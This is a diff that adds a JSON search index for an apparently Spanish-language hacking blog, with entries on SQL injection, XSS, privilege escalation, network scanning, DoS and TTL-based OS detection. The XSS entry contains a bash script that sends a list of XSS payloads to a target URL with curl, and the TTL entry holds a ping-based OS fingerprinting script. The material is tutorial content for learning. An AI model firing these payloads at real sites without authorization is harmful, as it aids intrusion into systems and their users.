@@ -1,0 +1,106 @@
+[
+  
+  {
+    "title": "Injecta codigo sql en  una web ☠",
+    "url": "/posts/Sqli/",
+    "categories": "Hacking, Vuln, Programacion, bash",
+    "tags": "Hacking, Vuln, Programacion, bash",
+    "date": "2023-01-05 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname"
+  },
+  
+  {
+    "title": "Hackea sitios web  Explotando un (XSS) - (Cross-Site Scripting) 💀",
+    "url": "/posts/vuln-XSS/",
+    "categories": "Hacking, Vuln, Programacion, bash",
+    "tags": "Hacking, Vuln, Programacion, bash",
+    "date": "2023-01-05 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostnameLa razon  por  la cual decidi crear  este articulo  es  que  aprenda  a explotar   un  (Cross-Site Scripting)...",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostnameLa razon  por  la cual decidi crear  este articulo  es  que  aprenda  a explotar   un  (Cross-Site Scripting)  en  paginas WEB entiendas  que es  un (Cross-Site Scripting), puedas crear  scripts  para la  automatizacion de  un  (Cross-Site Scripting)Primero  definamos   que es (XSS) o (Cross-Site Scripting) - El (Cross-Site Scripting) es un tipo de vulnerabilidad  que  permite  injectar  codigo similar a  lo  que es es  la (SQLi) o (SQL  Injection)  aplicación web que permite a un atacante injectar y  ejecutar   código malicioso en una pagina web entre  estos  e s posible   injectar codigo  (Javascript,HTML,CSS).##Existen cuatro tipos  de  (Cross-Site Scripting)      Cross-site scripting  REFLEJADO    Cross-site scripting  ALAMECENADO    Cross-site scripting  DOOM    Cross-site scripting  BLINDADO  Os  comparto  este script  en bash  para  efectuar un XSS  usando el  comando curl  #!/bin/bash   # Verifica que se haya proporcionado una URL y un método HTTP como argumento if [ -z \"$1\" ] || [ -z \"$2\" ]; then    echo \"Se deben proporcionar una URL y un método HTTP como argumentos\"    exit 1 fi url=$1 method=$2 # Crea una lista con  etiquetas de inyección XSS xss_tags=(  \"&lt;script&gt;alert('XSS')&lt;/script&gt;\"  \"&lt;img src='x' onerror='alert(\\\"XSS\\\")'&gt;\"  \"&lt;div style='color: expression(alert(\\\"XSS\\\"));'&gt;\"  \"&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;\"  \"&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;\"  \"&lt;body onload=alert(1)&gt;\"  \"&lt;object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='&gt;\"  \"&lt;iframe src='javascript:alert(\\\"XSS\\\")'&gt;\"  \"&lt;link rel='import' href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='&gt;\"  \"&lt;embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='&gt;\"  \"&lt;math&gt;&lt;a xlink:href='data:x,&lt;script&gt;alert(1)&lt;/script&gt;'&gt;CLICKME&lt;/a&gt;&lt;/math&gt;\"  \"&lt;form&gt;&lt;button formaction='javascript:alert(\\\"XSS\\\")'&gt;XSS&lt;/button&gt;&lt;/form&gt;\"  \"&lt;isindex type=image src=1 onerror=alert(1)&gt;\"  \"&lt;frame src='javascript:alert(\\\"XSS\\\")'&gt;\"  \"&lt;b&gt;&lt;svg&gt;&lt;script&gt;alert(1)&gt;&lt;/script&gt;&lt;/svg&gt;&lt;/b&gt;\"  \"&lt;details open ontoggle=alert(1)&gt;&lt;summary&gt;XSS&lt;/summary&gt;&lt;/details&gt;\"  \"&lt;keygen onfocus=alert(1)&gt;\"  \"&lt;audio src='data:audio/x;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='&gt;\"  \"&lt;video src='data:video/x;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='&gt;\"  )  # Realiza una solicitud HTTP utilizando curl. for tag in \"${xss_tags[@]}\"; do    echo \"Probando etiqueta: $tag\"    if [ \"$method\" = \"GET\" ]; then    # Envía la solicitud GET y muestra el código de estado HTTP de la respuesta    status_code=$(curl -s -o /dev/null -w \"%{http_code}\" \"$url?input=$tag\")    echo \"Código de estado: $status_code\"    elif [ \"$method\" = \"POST\" ]; then     # Envía la solicitud POST y muestra el código de estado HTTP de la respuesta     status_code=$(curl -s -o /dev/null -w \"%{http_code}\" -X POST \"$url\" -d \"input=$tag\")     echo \"Código de estado: $status_code\"    else      echo \"Método HTTP no válido\"      exit 1    fi done"
+  },
+  
+  {
+    "title": "Escala  privilegios en  linux  💀",
+    "url": "/posts/privilege_escalation/",
+    "categories": "Privilege escalation Linux, Hacking, OSCP",
+    "tags": "Privilege escalation Linux, Hacking, OSCP",
+    "date": "2023-01-05 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname"
+  },
+  
+  {
+    "title": "Mapea  una  (RED) ☠",
+    "url": "/posts/scanning/",
+    "categories": "Scaning, Hacking, Programacion, bash, bypassing",
+    "tags": "Scaning, Hacking, Programacion, bash, bypassing",
+    "date": "2021-12-01 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname"
+  },
+  
+  {
+    "title": "Tira  una pagina web  usando un (DoS) ☠",
+    "url": "/posts/Dos/",
+    "categories": "Hacking, DoS, Programacion, bash",
+    "tags": "Hacking, DoS, Programacion, bash",
+    "date": "2021-12-01 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostname"
+  },
+  
+  {
+    "title": "Reconocimiento de os  por ( TTL )",
+    "url": "/posts/ttl-recon/",
+    "categories": "Hacking, Reconocimiento, Programacion, bash",
+    "tags": "Hacking, Reconocimiento, Programacion, bash",
+    "date": "2021-12-01 12:00:00 +0000",
+    
+
+
+
+
+
+    
+    "snippet": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostnameReconoce el sistema instalado en un host a través del (TTL)Él (TTL) es el tiempo de vida de donde lo veas, pe...",
+    "content": "  Github :  https://github.com/th3hostname - Twitter  :  https://twitter.com/th3hostnameReconoce el sistema instalado en un host a través del (TTL)Él (TTL) es el tiempo de vida de donde lo veas, pero ala hora de determinar el OS dé un host se usan Rangos.Rangos TTL  -&gt;  0-64  - Maquina  (LINUX) TTL  -&gt;  64-128  - Maquina  (WINDOWS)Para  saber  el TTL  del host  objetivo   podemos  usar  el comando  ping  Example ping  -c1  192.168.1.64 Obtendremos así él (TTL)  y ya sabiendo  los  rangos podemos  determinar  el host     NOTA: Por cada  nodo intermedio  él  (TTL) disminuirá  en una unidad, si no pasara por ningún nodo intermedio  él (TTL) siempre  seria  (64 en  caso de  una máquina  Linux)  y (128  en caso  deuna  máquina Windows)  Para ubicar directamente podemos usar el siguiente (Comando) ping  -c1  google.com  | grep  ttl  |  cut -d  ' ' -f 7Pero podemos  hacer esta tarea más fácil  creando un simple script en (Bash)  whichSystem #!/bin/bash  # Author :  (ak) th3hostname - IRVING ST.  # nmap y  pa dentro  -&gt;  happy  hacking   ip_address=$1 #  Control_C  trap  ctrl_c INT  function ctrl_c(){     echo  \"exit ...\"     rm ping.log &gt; /dev/null  2&gt;&amp;1     exit 1  } # System  recognition  function function detecSystem(){     ping  -c 1  $ip_address &gt;  ping.log      for ((i=30;  i&lt;=64;  i++)); do           grep ttl=$i  ping.log &gt;  /dev/null 2&gt;&amp;1            if [ \"$(echo $?)\"  == \"0\" ];  then                echo  \"ip  addres -&gt; $ip_address - LINUX  - TTL($i) \"             fi          done         for ((i=70; i&lt;=150; i++));do            grep  ttl=$i ping.log &gt; /dev/null 2&gt;&amp;1           if  [ \"$(echo $?)\" ==  \"0\"  ];  then                 echo \"ip addres -&gt; $ip_address - WINDOWS - TTL($i) \"                         fi     done   }  #  Execution check   if [ \"$#\"  == \"1\" ];then     detecSystem     rm ping.log  &gt;  /dev/null  2&gt;&amp;1  else       echo \"usague: whichSystem  192.168.1.64\"       rm ping.log  &gt;  /dev/null  2&gt;&amp;1 fiSin  nada  mas que  decir “HAPPY HACKING”  espero  a verte ayudado."
+  }
+  
+]
+
